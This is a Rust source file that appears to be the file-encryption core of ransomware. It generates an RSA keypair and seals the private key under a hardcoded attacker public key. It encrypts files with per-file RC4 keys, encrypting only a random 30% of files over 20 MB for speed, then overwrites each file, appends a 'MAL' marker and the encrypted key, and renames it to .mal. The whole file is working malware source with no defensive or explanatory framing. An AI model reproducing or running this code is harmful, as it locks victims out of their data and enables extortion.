use rand::rngs::OsRng;
use rand::RngCore;
use rc4::consts::U16;
use rc4::{Key, KeyInit, Rc4, StreamCipher};
use rsa::pkcs1::EncodeRsaPrivateKey;
use rsa::pkcs8::LineEnding;
use rsa::Pkcs1v15Encrypt;
use rsa::{RsaPrivateKey, RsaPublicKey};
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::Path;

use crate::resources::FILE_SIZE_20_MB;

pub fn generate_rsa_keypair() -> (RsaPrivateKey, RsaPublicKey) {
    let mut rng = OsRng;
    let bits = 2048;
    let private_key = RsaPrivateKey::new(&mut rng, bits).expect("Failed to generate a key");
    let public_key = RsaPublicKey::from(&private_key);
    (private_key, public_key)
}

pub fn encrypt_rsa_key_with_hardcoded_key(
    private_key: &RsaPrivateKey,
    hardcoded_pub_key: &RsaPublicKey,
) -> Vec<u8> {
    let private_key_pem = private_key
        .to_pkcs1_pem(LineEnding::default())
        .expect("Failed to convert private key to PEM");

    let private_key_bytes = private_key_pem.as_bytes();
    let mut encrypted_chunks = Vec::new();
    let mut offset = 0;

    while offset < private_key_bytes.len() {
        let end = std::cmp::min(offset + 245, private_key_bytes.len());
        let chunk = &private_key_bytes[offset..end];
        let encrypted_chunk = hardcoded_pub_key
            .encrypt(&mut OsRng, Pkcs1v15Encrypt, chunk)
            .expect("Failed to encrypt chunk");
        encrypted_chunks.extend(encrypted_chunk);
        offset = end;
    }

    encrypted_chunks
}

pub fn generate_random_rc4_key() -> Vec<u8> {
    let mut key = [0u8; 16];
    OsRng.fill_bytes(&mut key);
    key.to_vec()
}

pub fn encrypt_rc4_key_with_rsa(rc4_key: &[u8], rsa_private_key: &RsaPublicKey) -> Vec<u8> {
    rsa_private_key
        .encrypt(&mut OsRng, Pkcs1v15Encrypt, rc4_key)
        .expect("Failed to encrypt RC4 key")
}

pub fn encrypt_file_with_rc4(
    path: &Path,
    rc4_key: &[u8],
    encrypted_rc4_key: &[u8],
) -> std::io::Result<()> {
    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let metadata = file.metadata().expect("Failed to read file metadata");
    let file_size = metadata.len();

    let key = Key::<U16>::from_slice(rc4_key);
    let mut cipher = Rc4::new(key);

    if file_size < FILE_SIZE_20_MB {
        // Whole file
        cipher.apply_keystream(&mut buffer);
    } else {
        // 30% of the file
        let part_to_encrypt = (buffer.len() as f64 * 0.3) as usize;
        let mut rng = OsRng;
        let start = rng.next_u64() as usize % (buffer.len() - part_to_encrypt + 1);
        cipher.apply_keystream(&mut buffer[start..start + part_to_encrypt]);
    }

    // Append MAL signature and encrypted RC4 key
    let mut encrypted_file = File::create(path)?;
    encrypted_file.write_all(&buffer)?;
    encrypted_file.write_all(b"MAL")?;
    encrypted_file.write_all(encrypted_rc4_key)?;

    // Change file extension to .mal
    let new_path = path.with_extension("mal");
    fs::rename(path, new_path)?;

    Ok(())
}
